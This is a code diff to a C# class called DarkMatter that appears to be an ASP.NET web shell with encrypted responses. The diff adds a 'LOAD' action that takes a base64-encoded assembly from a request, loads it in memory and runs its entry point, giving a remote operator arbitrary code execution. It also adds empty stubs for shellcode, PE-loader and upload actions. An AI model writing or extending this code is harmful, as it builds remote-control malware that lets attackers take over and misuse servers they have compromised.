@@ -4,6 +4,9 @@ using System.IO;
 using System.Diagnostics;
 using System.Text;
 using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Reflection;
+using System.Threading;
 
 public class DarkMatter
 {
@@ -80,6 +83,32 @@ public class DarkMatter
                 response.Clear();
                 response.ContentType = "application/octet-stream";
                 response.BinaryWrite(abEncryptedResp);
+            }
+            else if (szAction == "LOAD")
+            {
+                byte[] abBuffer = Convert.FromBase64String(dic["buffer"]);
+                Assembly asm = Assembly.Load(abBuffer);
+                MethodInfo ep = asm.EntryPoint;
+                if (ep != null)
+                {
+                    object[] args = null;
+                    if (ep.GetParameters().Length > 0)
+                        args = new object[] {new string[0]};
+
+                    ep.Invoke(null, args);
+                }
+            }
+            else if (szAction == "SHELLCODE")
+            {
+                
+            }
+            else if (szAction == "PELOADER")
+            {
+                
+            }
+            else if (szAction == "UPLOAD")
+            {
+                
             }
         }
         catch (Exception ex)
